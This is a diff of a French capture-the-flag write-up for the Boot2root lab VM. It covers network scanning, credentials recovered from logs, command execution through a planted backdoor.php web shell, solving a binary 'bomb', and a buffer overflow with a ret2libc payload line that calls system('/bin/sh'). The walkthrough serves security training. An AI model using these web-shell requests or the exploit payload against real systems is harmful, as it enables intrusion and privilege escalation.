@@ -1,26 +1,29 @@
 # Writeup1
 ## 1. Découvrir l'adresse IP
-* Mode host-only
+* Mode host-only (Création d'un host-only si pas déjà fait)
 ```
 ipconfig 
-nmmap  192.168.56.0/24 
+nmap  192.168.56.0/24
 ``` 
-![alt text](image-1.png)
+![alt text](/scripts/img/image-1.png)
 
 * vboxnet0 : interface qui fait partie de VirtualBox  utilisée pour les connexions réseau entre l'hôte (la machine physique) et les machines virtuelles. 
 Adresse IPv4 : inet 192.168.56.1
-![alt text](image-2.png)
+![alt text](/scripts/img/image-2.png)
 * nmap 192.168.56.0/24 scanne toutes les adresses IP dans le sous-réseau (0-255) pour détecter les hôtes actifs et les ports ouverts sur ces machines = cartographier le réseau local.
 
 * L'adresse du serveur est donc :  192.168.56.101
-![alt text](image-3.png)
+![alt text](/scripts/img/image-3.png)
 
 ## 2. Websites
+* `dirb https://192.168.56.101 -r`
+```sh
 
+```
 
 ## 3. Forum
 #### Password of a user : lmezard
-![alt text](image-4.png)
+![alt text](/scripts/img/image-4.png)
 
 * Grep tous les invalid user, on voit qu'une entrée semble être un mot de passe :
 
@@ -35,7 +38,7 @@ Password : !q\]Ej?*5K5cy*AJ
 Email : laurie@borntosec.net 
 
 Les autres utilisateurs sont :
-![alt text](image-5.png)
+![alt text](/scripts/img/image-5.png)
 
 ## 4. SquirrelMail
 
@@ -43,7 +46,7 @@ Avec les identifiants trouvés sur le forum, on se connecte:
 Email : laurie@borntosec.net 
 Password : !q\]Ej?*5K5cy*AJ
 
-![alt text](image-6.png)
+![alt text](/scripts/img/image-6.png)
 
 user : root
 Password : Fg-'kKXBj87E:aJ$
@@ -73,7 +76,7 @@ https://192.168.56.101/forum/templates_c/backdoor.php?cmd=%22ls%22%20/home/LOOKA
 https://192.168.56.101/forum/templates_c/backdoor.php?cmd=%22cat%22%20/home/LOOKATME/password
 
 ```
-![alt text](image-7.png)
+![alt text](/scripts/img/image-7.png)
 
 lmezard:G!@M6f4Eatau{sF"
 
@@ -89,42 +92,42 @@ open
 lmezard
 G!@M6f4Eatau{sF"
 ```
-![alt text](image-8.png)
+![alt text](/scripts/img/image-8.png)
 
 * On a deux fichier README & fun
 ```
 get fun
 get README
 ```
-![alt text](image-9.png)
+![alt text](/scripts/img/image-9.png)
 
 ## 7. Challenge ssh laurie
-
 
 ```
 cat README
 file README
 file fun
 ```
-![alt text](image-10.png)
+![alt text](/scripts/img/image-10.png)
 * ft_fun est un dossier remplit de fichier .pcap
 
 * Ce sont de faux fichiers :
 
-![alt text](image-11.png)
+![alt text](/scripts/img/image-11.png)
 
 1. Print tous les fichiers avec print_files.py
 2. Trouver le fichier avec main() avec find_main.py
-3. Concatenons les fichiers dans l'ordre `python scripts/concatenate_files.py /mnt/nfs/homes/abensett/Desktop/29.-Boot2root/ft_fun resultats.c`
+3. Concatenons les fichiers dans l'ordre `python scripts/concatenate_files.py /mnt/nfs/ft_fun resultats.c`
 4. `gcc resultats.c` `./a.out` -> `MY PASSWORD IS: Iheartpwnage Now SHA-256 it and submit`
 5. sha256 du mot de passe : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
 
+
+## 8. laurie
+
 * laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
-## 8. ssh
-
 1. On se connecte avec les identifiants, on obtient deux fichiers bomb et README
-![alt text](image-12.png)
+![alt text](/scripts/img/image-12.png)
 2. On télécharge le fichier bombe avec scp : `scp -p 22 laurie@192.168.56.101:/home/laurie/bomb .`
 3. Reverse Engineering avec Ghidra :
 1. `Public speaking is very easy.`
@@ -142,11 +145,103 @@ Le sixième nombre : 720 (car 6 * 120 = 720)
 En analysant les valeurs de la suite de Fibonacci, on trouve que func4(9) retourne 55. Donc, pour éviter l'explosion, l'utilisateur doit entrer 9 comme valeur
 `9`
 5. giants
+
+L’objectif est de trouver une chaîne de 6 caractères où chaque caractère correspond à une lettre de "giants" en utilisant les low bits de chaque caractère de la chaîne d'entrée pour choisir un index dans "isrveawhobpnutfg"
 * Le chiffrement utilise les 4 derniers bits de chaque caractère pour déterminer à quel caractère de la clé key il correspond.
 * Comme plusieurs caractères peuvent partager les mêmes 4 derniers bits, il existe plusieurs entrées valides pour obtenir la sortie "giants".
 * Cela conduit à plusieurs combinaisons d'entrées valides, qui peuvent aboutir à la même chaîne de sortie.
 Ainsi, la réponse à cette phase du défi pourrait être n'importe quelle chaîne d'entrée parmi les possibilités valides comme "opekma", "opekmq", ou "opukmq".
 
-6.
+`opekma`
+
+6.  Les valeurs doivent être décroissantes, pour les afficher :
+```sh
+info variables
+x [adresse]
+node4 = 997
+node2 = 725
+node6 = 432
+node3 = 301
+node1 = 253
+node5 = 212
+```
+`4 2 6 3 1 5`
+
+## 9. thor
+* `ssh thor@192.168.56.101`
+* thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
+* `scp -P 22 thor@192.168.56.101:/home/thor/turtle .`
+
+![alt text](/scripts/img/image-13.png)
+* `SLASH` -> md5 -> 646da671ca01bb5d84dbb5fb2238dc8e
+
+## 10. zaz
+* `ssh zaz@192.168.56.101`
+* zaz/646da671ca01bb5d84dbb5fb2238dc8e
+
+1. Il y a un exploit_me, on desassemble le main :
+
+``` sh
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   %ebp
+   0x080483f5 <+1>:	mov    %esp,%ebp
+   0x080483f7 <+3>:	and    $0xfffffff0,%esp
+   0x080483fa <+6>:	sub    $0x90,%esp
+   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    $0x1,%eax
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    0xc(%ebp),%eax
+   0x08048410 <+28>:	add    $0x4,%eax
+   0x08048413 <+31>:	mov    (%eax),%eax
+   0x08048415 <+33>:	mov    %eax,0x4(%esp)
+   0x08048419 <+37>:	lea    0x10(%esp),%eax
+   0x0804841d <+41>:	mov    %eax,(%esp)
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    0x10(%esp),%eax
+   0x08048429 <+53>:	mov    %eax,(%esp)
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    $0x0,%eax
+   0x08048436 <+66>:	leave  
+   0x08048437 <+67>:	ret   
+``` 
+* Le programme prend un argument et le puts
+### Buffer Overflow et Ret2lic
+#### 1. Offset 
+Le but est de découvrir **le nombre de caractères à partir duquel le programme** commence à écraser des parties importantes de la mémoire. Pour cela, on utilise un generateur de motif: 
+* Le programme crash avec un segmentation fault (SIGSEGV), ce qui signifie que la mémoire a été corrompue, car il essaie d'accéder à une adresse invalide après un buffer overflow.
+```sh
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()
+``
+* Offset : 140
+
+#### 2. Ret2libc
+On remplace l'adresse de retour de la fonction par l'adresse d'une fonction de la bibliothèque libc : system.
+```
+(gdb) info address system
+Symbol "system" is at 0xb7e6b060 in a file compiled without debugging.
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+(gdb)  find __libc_start_main,+99999999,"/bin/sh"
+0xb7f8cc58
+```
+* Adresse de system : 0xb7e6b060
+* Adresse de "/bin/sh" : 0xb7f8cc58
 
 
+#### 3. Payload
+* Adresses en litlle endian
+```
+./exploit_me $(python -c 'print "\x90" * 140 + "\x60\xb0\xe6\xb7" + "\x90\x90\x90\x90" + "\x58\xcc\xf8\xb7"')
+```
+
+
+# Ressources
+* https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+* https://beta.hackndo.com/retour-a-la-libc/
